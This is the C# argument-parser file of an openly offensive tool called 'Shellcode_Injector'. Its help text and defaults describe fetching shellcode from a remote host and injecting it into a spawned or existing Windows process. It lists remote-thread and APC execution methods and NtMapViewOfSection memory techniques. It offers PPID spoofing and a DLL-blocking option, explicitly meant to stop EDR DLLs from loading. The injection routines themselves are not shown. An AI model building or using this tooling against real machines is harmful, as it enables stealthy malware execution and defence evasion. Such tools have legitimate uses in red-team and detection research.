using System;
using System.Collections.Generic;
using System.ComponentModel;


namespace Shellcode_Injector
{
    internal class Parser
    {
        public Dictionary<string, string> shellcode { get; private set;}

        public Dictionary<string, object> process { get; private set; } 

        public Dictionary<string, string> memory { get; private set; }

        public Dictionary<string, string> exec { get; private set; }

        public uint ppid { get; private set; }

        public uint pid { get; private set; }

        public Parser(string[] args) 
        {
            pid = 0;
            //initialize defaults 
            shellcode = new Dictionary<string, string> 
            {
                { "host", "http://localhost" },
                { "file", "calc.bin" }
            };

            process = new Dictionary<string, object>
            {
                { "cmd", "C:\\Windows\\System32\\notepad.exe"},
                { "cwd", "C:\\Windows\\System32"},
                { "spoof_ppid", false },
                { "block_dlls", false }
            };

            //standard or ntsection
            memory = new Dictionary<string, string>
            {
                { "technique", "standard" }
            };

            //rthread - CreateRemoteThread
            //quapc - QueueUserAPC
            //ntthread - NTCreateThreadEx
            //ntqathread - NtQueueApcThread
            exec = new Dictionary<string, string>
            {
                { "technique", "rthread" }
            };

            if (args.Length == 0) 
            {
                PrintHelp();
                Environment.Exit(0);
            }

            //Go trough the supplied arguments
            for (int i = 0; i < args.Length; i ++) 
            {
                string current = args[i];
                //Parse shellcode arguments
                if (current.StartsWith("--host") && i + 1 < args.Length)
                {
                    shellcode["host"] = args[i + 1];
                }
                else if (current.StartsWith("--file") && i + 1 < args.Length)
                {
                    shellcode["file"] = args[i + 1];
                }
                //Remote injection or sacrifical process
                else if (current.StartsWith("--remote-proc") && i + 1 < args.Length) 
                {
                    if (uint.TryParse(args[i + 1], out uint result))
                    {
                        pid = result;
                    }
                    else 
                    {
                        throw new Win32Exception("Please provide a valid integer for proccess ID");
                    }
                }
                //Parse create process arguments
                else if (current.StartsWith("--proc-cmd") && i + 1 < args.Length)
                {
                    process["cmd"] = args[i + 1];
                }
                else if (current.StartsWith("--proc-cwd") && i + 1 < args.Length)
                {
                    process["cwd"] = args[i + 1];
                }
                else if (current.StartsWith("--proc-spoof-ppid"))
                {
                    process["spoof_ppid"] = true;
                }
                else if (current.StartsWith("--proc-blockdlls"))
                {
                    process["block_dlls"] = true;
                }
                else if (current.StartsWith("--proc-ppid") && i + 1 < args.Length)
                {
                    var pp = args[i + 1];
                    uint.TryParse(pp, out uint result);
                    ppid = result;
                }
                //Parse memory allocation arguments
                else if (current.StartsWith("--mem-alloc") && i + 1 < args.Length)
                {
                    memory["technique"] = args[i + 1];
                }
                //Parse shellcode execution arguments
                else if (current.StartsWith("--exec-type") && i + 1 < args.Length)
                {
                    exec["technique"] = args[i + 1];
                }
                //Help message
                else if (current.StartsWith("--help"))
                {
                    PrintHelp();
                    Environment.Exit(0);
                }
            }
        }

        public void PrintHelp() 
        {
            var help_msg = @"
Command line arguments help

Shellcode 

--host               Remote host from which to fetch the shellcode, it should be specified along with the scheme http/https, default value: http://localhost

--file               File that is containing the shellcode, this should be fetched from the remote host, default value: calc.bin


Remote process injection
--remote-proc        PID of a remote process to inject, default: 0


Process creation, these flags control the process that will be created for shellcode injection

--proc-cmd           Command to be executed by the spawned process, default value: C:\Windows\System32\notepad.exe

--proc-cwd           Current working directory to be passed to the spawned process, default value: C:\Windows\System32

--proc-spoof-ppid    Boolean value to specify if PPID spoofing for the process should be enabled, default value: false

--proc-ppid          Integer value to specify the PPID that the spawened process will have, default value: 0

--proc-blockdlls     Boolean value to specify if the sacrifical process should block the loading of DLLs not signed by microsoft, default valie: false


Memory allocation technique, possible values are standard or ntsection
standard   ->  VirtualAllocEx, VirtualProtextEx, WriteProcessMemory
ntsection  ->  NTCreateSection, NTMapViewOfSection, copy shellcode, NTMapViewOfSection to remote process 

--mem-alloc          What technique should be used to allocate memory for the shellcode, default value: standard 


Shellcode execution technique, possible values are rthread, quapc, ntthread, ntqathread
rthread    ->  CreateRemoteThread
quapc      ->  QueueUserAPC
ntthread   ->  NTCreateThreadEx
ntqathread ->  NtQueueApcThread

--exec-type          What technique should be used to execute the shellcode, default value: rthread


Examples:
shellcode_injector.exe --host http://localhost:8080 --file calc.bin --mem-alloc standard --exec-type rthread
shellcode_injector.exe --host http://localhost:8080 --file calc.bin --mem-alloc ntsection --exec-type ntqathread --proc-spoof-ppid --ppid 752


Note: 
In order to spoof the parent process ID for the newly created process, you have to have the necessary permissions...
eg. with a regular user you cant use a SYSTEM level process for ppid.
Setting --proc-blockdlls will set the PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY property on the sacrifical process, this can be useful when EDR dlls are being loaded
At the moment for remote process injection only CreateRemoteThread and NTCreateThreadEx executions are possible.ss
            ";

            Console.WriteLine(help_msg);
        }
    }
}
